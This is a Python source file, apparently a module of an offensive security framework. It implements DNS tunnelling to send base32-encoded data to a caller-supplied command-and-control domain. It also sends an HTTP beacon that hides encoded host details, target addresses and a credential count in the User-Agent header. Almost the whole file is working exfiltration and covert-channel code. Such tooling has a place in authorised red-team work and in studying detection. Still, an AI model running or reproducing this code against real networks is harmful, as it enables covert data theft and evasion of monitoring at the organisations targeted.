"""DNS exfiltration and HTTP beacon tunneling for C2 or data exfiltration."""

from __future__ import annotations

import base64
import json
import socket
from datetime import datetime, timezone
from typing import List

from aegis.models import AttackResult, EngagementContext
from aegis.logger import log
from aegis.modules.base import BaseModule
from aegis.utils.network import sleep_if_stealth
from aegis.data.ports import C2_DNS_CHUNK_SIZE

try:
    import requests as _req_lib
    REQUESTS = True
except ImportError:
    REQUESTS = False


class TunnelModule(BaseModule):
    """DNS exfiltration and HTTP beacon tunneling for C2 or data exfiltration."""

    name = "tunnel"

    def run(self, ctx: EngagementContext, **kwargs: object) -> List[AttackResult]:
        c2_domain: str = str(kwargs.get("c2_domain", ""))
        data_to_exfil: str = str(kwargs.get("data_to_exfil", ""))

        results: List[AttackResult] = []
        if c2_domain:
            results.extend(self._dns_tunnel_exfil(ctx, c2_domain, data_to_exfil or "NETREAPER_TEST"))
        results.extend(self._http_beacon(ctx))
        return results

    # ------------------------------------------------------------------
    # DNS tunnel exfiltration
    # ------------------------------------------------------------------

    def _dns_tunnel_exfil(self, ctx: EngagementContext,
                           c2_domain: str, data: str) -> List[AttackResult]:
        results: List[AttackResult] = []
        encoded = base64.b32encode(data.encode()).decode().rstrip("=").lower()
        chunks = [encoded[i:i + C2_DNS_CHUNK_SIZE] for i in range(0, len(encoded), C2_DNS_CHUNK_SIZE)]
        log(f"[Tunnel/DNS] Exfiltrating {len(data)} bytes via DNS ({len(chunks)} queries) to {c2_domain}", "INFO")

        sent_queries: List[str] = []
        for i, chunk in enumerate(chunks):
            query = f"{chunk}.{i:04d}.{c2_domain}"
            try:
                socket.getaddrinfo(query, None)
                sent_queries.append(query)
            except socket.gaierror:
                sent_queries.append(query)  # Expected NXDOMAIN -- still registers on C2
            sleep_if_stealth(ctx)

        results.append(AttackResult(
            "tunnel", "dns_exfil", "SUCCESS" if sent_queries else "FAILED",
            severity="HIGH",
            data={"c2_domain": c2_domain, "queries_sent": len(sent_queries),
                  "sample": sent_queries[0] if sent_queries else ""},
            notes=f"DNS exfil: {len(sent_queries)} queries sent to {c2_domain}. "
                  f"Data will appear in DNS logs as queries: <b32data>.<seq>.{c2_domain}",
        ))
        return results

    # ------------------------------------------------------------------
    # HTTP beacon
    # ------------------------------------------------------------------

    def _http_beacon(self, ctx: EngagementContext) -> List[AttackResult]:
        # Demonstrate HTTP C2 beacon pattern using detected open HTTP ports
        http_ports = [op for op in ctx.open_ports if op.service in ("HTTP", "HTTP-Alt", "HTTPS")]
        if not http_ports or not REQUESTS:
            return []
        results: List[AttackResult] = []
        # Covert beacon in User-Agent / X-Forwarded-For header
        beacon_data = {
            "hostname": socket.gethostname(),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "targets": [op.host for op in ctx.open_ports[:5]],
            "credentials": len(ctx.credentials),
        }
        beacon_b64 = base64.b64encode(json.dumps(beacon_data).encode()).decode()
        try:
            op = http_ports[0]
            proto = "https" if op.port in (443, 8443) else "http"
            _req_lib.get(
                f"{proto}://{op.host}:{op.port}/",
                headers={"User-Agent": f"Mozilla/5.0 ({beacon_b64[:30]})"},
                timeout=ctx.timeout, verify=False,
            )
            results.append(AttackResult(
                "tunnel", "http_beacon", "SUCCESS",
                host=op.host, severity="INFO",
                data={"beacon_payload": beacon_data, "encoded": beacon_b64[:40] + "..."},
                notes=f"HTTP beacon sent to {op.host}:{op.port} via User-Agent header",
            ))
        except Exception:
            pass
        return results
